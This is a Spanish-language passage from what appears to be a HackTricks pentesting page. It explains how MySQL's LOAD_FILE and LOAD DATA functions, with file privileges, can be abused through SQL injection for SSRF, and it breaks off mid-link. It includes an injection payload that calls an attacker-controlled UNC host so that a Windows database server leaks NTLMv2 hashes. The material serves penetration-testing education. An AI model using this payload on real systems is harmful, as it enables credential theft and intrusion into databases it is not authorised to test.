# Privilegio de archivo MySQL para SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Publicaci√≥n copiada de** [**https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona**](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona)

### LOAD\_FILE/LOAD DATA/LOAD XML para SSRF

Cada art√≠culo de exfiltraci√≥n de datos SQL Out of Band utilizar√° la funci√≥n de cadena `LOAD_FILE()` para realizar una solicitud de red. La funci√≥n en s√≠ tiene sus propias limitaciones basadas en el sistema operativo en el que se ejecuta y en la configuraci√≥n con la que se inici√≥ la base de datos.

Por ejemplo, si la variable global `secure_file_priv` no se estableci√≥, el [valor predeterminado se establece en `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), lo que significa que solo puede usar funciones como `LOAD_FILE('filename')` o `LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename` para leer archivos del directorio `/var/lib/mysql-files/`. Para poder realizar lecturas en archivos fuera de este directorio, la opci√≥n `secure_file_priv` debe establecerse en `""`, lo que solo se puede hacer actualizando el archivo de configuraci√≥n de la base de datos o pasando el par√°metro de inicio `--secure_file_priv=""` al servicio de la base de datos.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

Sin embargo, en circunstancias en las que `secure_file_priv` se establece en `""`, deber√≠amos poder leer otros archivos en el sistema, suponiendo que los permisos de lectura de archivos y `file_priv` se establezcan en `Y` en `mysql.user` para el usuario de la base de datos actual. Sin embargo, poder usar estas funciones para realizar llamadas de red depende mucho del sistema operativo. Como estas funciones est√°n dise√±adas solo para leer archivos, las √∫nicas llamadas relevantes para la red que se pueden realizar son a rutas UNC en hosts de Windows, ya que [la API de Windows `CreateFileA` que se llama al acceder a un archivo entiende las convenciones de nomenclatura UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Por lo tanto, si su base de datos objetivo se est√° ejecutando en una m√°quina Windows, la consulta de inyecci√≥n `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` [resultar√≠a en que la m√°quina Windows env√≠e hashes NTLMv2 en un intento de autenticarse con el `\\attackerserver.example.com` controlado por el atacante](https://packetstormsecurity.com/files/140832/MySQL-
